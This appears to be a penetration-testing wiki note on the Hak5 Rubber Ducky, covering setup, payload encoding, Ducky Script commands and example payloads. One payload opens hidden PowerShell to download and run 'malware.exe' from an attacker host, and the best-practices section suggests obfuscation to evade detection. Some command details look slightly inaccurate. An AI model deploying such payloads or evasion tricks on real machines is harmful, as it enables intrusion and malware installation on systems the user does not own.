- [[Hot Plug]]
	- [[Hak5 Bash Bunny]]
	- [[Hak5 Plunder Bug LAN Tap]]
	- [[Hak5 Rubber Ducky]]
	- [[Hak5 SharkJack]]

The Hak5 Rubber Ducky is a USB-based keystroke injection tool that emulates a keyboard to rapidly execute pre-defined scripts on a target machine. It is commonly used in penetration testing and red teaming for performing automated attacks, such as privilege escalation, data exfiltration, or payload deployment.

The Rubber Ducky interprets a scripting language called Ducky Script, which is human-readable and is translated into a payload that is executed when the Rubber Ducky is plugged into a target system. Since it emulates a keyboard, it can bypass many traditional security measures that don't prevent trusted human interaction.

# Setup and Usage

#### Hardware Setup
1. Acquiring the Device: Purchase the Hak5 Rubber Ducky from Hak5's online store.
2. SD Card: The Rubber Ducky uses a microSD card to store payloads. Insert the microSD card into the Rubber Ducky.
3. Preparing the Payload:
   - Write a Ducky Script (.txt file) that defines the commands you want to execute.
   - Convert the script to a format readable by the Rubber Ducky using the Duck Encoder (more details in the scripting section).
4. Flash the Payload: Place the encoded payload (in `.bin` format) onto the microSD card.
5. Deploy: Insert the Rubber Ducky into the target machine's USB port. It will automatically inject the keystrokes defined in the payload.

#### Software Setup: Duck Encoder
1. Download the Duck Encoder:
   The Duck Encoder is a tool that converts human-readable Ducky Script into an inject.bin file, which the Rubber Ducky reads and executes.
   - https://docs.hak5.org/hak5-usb-rubber-ducky
   - You can use either the Java-based encoder or a command-line encoder.
   
2. Java-Based Encoder:
   - Download and install [Java](https://www.java.com/en/download/).
   - Clone the Rubber Ducky repository:
     ```bash
     git clone https://github.com/hak5darren/USB-Rubber-Ducky.git
     ```
   - Run the encoder:
     ```bash
     java -jar encoder.jar -i <input_script.txt> -o <output_payload.bin>
     ```
     Example:
     ```bash
     java -jar encoder.jar -i my_payload.txt -o inject.bin
     ```

3. Command-Line Encoder:
   - Alternatively, you can use DuckEncoder in a terminal:
     ```bash
     ./duckencoder -i <input_script.txt> -o inject.bin
     ```

4. Copy Payload:
   - After encoding, place the `inject.bin` file onto the microSD card used by the Rubber Ducky.

5. Testing the Setup:
   - Test your payload on a test machine before using it in a live engagement to ensure it functions as expected.

# Scripting Deep Dive: Ducky Script

Ducky Script is a simple scripting language designed for writing payloads that are interpreted as keystrokes. Below is a breakdown of its syntax, commands, and usage.

#### Basic Ducky Script Commands

1. DELAY:
   - Adds a delay (in milliseconds) between commands.
   - Example: 
     ```bash
     DELAY 1000  # 1-second delay
     ```

2. STRING:
   - Types out a string as if it were typed on the keyboard.
   - Example:
     ```bash
     STRING Hello, World!
     ```

3. ENTER:
   - Simulates pressing the `Enter` key.
   - Example:
     ```bash
     ENTER
     ```

4. CONTROL, ALT, SHIFT:
   - Simulates modifier keys like `CTRL`, `ALT`, `SHIFT`.
   - Example:
     ```bash
     CTRL ALT DELETE  # Presses Ctrl + Alt + Delete
     ```

5. GUI (Windows Key):
   - Simulates pressing the Windows key (GUI key).
   - Example:
     ```bash
     GUI r  # Opens the "Run" prompt on Windows
     ```

6. REM:
   - Used for comments.
   - Example:
     ```bash
     REM This is a comment
     ```

7. CONTROL-ALT-DELETE:
   - Simulates pressing Ctrl + Alt + Delete on a Windows machine.
   - Example:
     ```bash
     CONTROL-ALT-DELETE
     ```

8. DOWNARROW, UPARROW, LEFTARROW, RIGHTARROW:
   - Simulates the arrow keys.
   - Example:
     ```bash
     DOWNARROW  # Simulates pressing the down arrow key
     ```

9. REPEAT:
   - Repeats the last command a specified number of times.
   - Example:
     ```bash
     DOWNARROW
     REPEAT 5  # Presses the down arrow key 5 times
     ```

#### Advanced Commands

1. ESCAPE:
   - Simulates pressing the `Escape` key.
   - Example:
     ```bash
     ESCAPE
     ```

2. MENU (App Key):
   - Simulates pressing the Menu (Context) key.
   - Example:
     ```bash
     MENU
     ```

3. TAB:
   - Simulates pressing the `Tab` key to switch between fields or windows.
   - Example:
     ```bash
     TAB
     ```

4. COMMAND (Mac):
   - Simulates pressing the Command key (on MacOS).
   - Example:
     ```bash
     COMMAND SPACE  # Opens Spotlight search on MacOS
     ```

5. PRINTSCREEN:
   - Simulates pressing the `Print Screen` key.
   - Example:
     ```bash
     PRINTSCREEN
     ```

6. PAUSE:
   - Adds a short break in the script execution.
   - Example:
     ```bash
     PAUSE 500  # Pauses for 500 milliseconds
     ```

# Example Payloads

#### Opening Notepad and Typing Text (Windows)
```bash
DELAY 500
GUI r
DELAY 500
STRING notepad
ENTER
DELAY 1000
STRING This is a test!
ENTER
```
This script will open the Run dialog (`GUI r`), type "notepad", press Enter to open it, then type "This is a test!" into Notepad.

#### Download and Execute Malware (Windows)
```bash
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri http://<attack_ip>/malware.exe -OutFile C:\Users\Public\malware.exe"
ENTER
DELAY 2000
STRING C:\Users\Public\malware.exe
ENTER
```
This script opens PowerShell, downloads a file from a remote server, and executes it.

#### Launch Terminal and Perform Command (MacOS/Linux)
```bash
DELAY 500
COMMAND SPACE
DELAY 500
STRING terminal
ENTER
DELAY 1000
STRING sudo apt update
ENTER
```
This script opens the Terminal on macOS/Linux and runs `sudo apt update`.

# Best Practices

- Test Locally: Always test your scripts on a local machine to ensure they function properly.
- Time Delays: Be cautious with delays. They allow time for the script to account for slower machines but can increase execution time.
- Obfuscation: To avoid detection during a red team engagement, consider obfuscating scripts or using encoded PowerShell commands.
- Multiple Scripts: You can store multiple payloads on different microSD cards for different engagements.